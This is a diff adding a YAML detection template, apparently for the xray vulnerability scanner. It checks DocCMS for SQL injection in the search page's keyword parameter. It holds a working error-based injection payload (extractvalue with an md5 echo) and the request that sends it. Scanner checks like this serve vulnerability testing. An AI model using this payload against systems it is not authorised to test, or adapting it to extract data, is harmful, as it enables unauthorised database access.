@@ -1,0 +1,23 @@
+name: poc-yaml-doccms-sqli
+binding: b89a1eda-8d1d-4e81-b073-5b1c46c435b7
+manual: true
+detail:
+    author: sodme
+    links:
+        - https://www.yuque.com/peiqiwiki/peiqi-poc-wiki/yyxv0r
+    vulnerability:
+        id: CT-416442
+        level: high
+transport: http
+set:
+    s1: string(randomInt(10000, 20000))
+    payload: |
+        urlencodeall(urlencodeall("1' and (extractvalue(1,concat(0x7e,(select md5(" + s1 + ")),0x7e)))#"))
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /search/index.php?keyword={{payload}}
+        expression: response.body.bcontains(bytes(substr(md5(s1), 1, 30)))
+expression: r0()
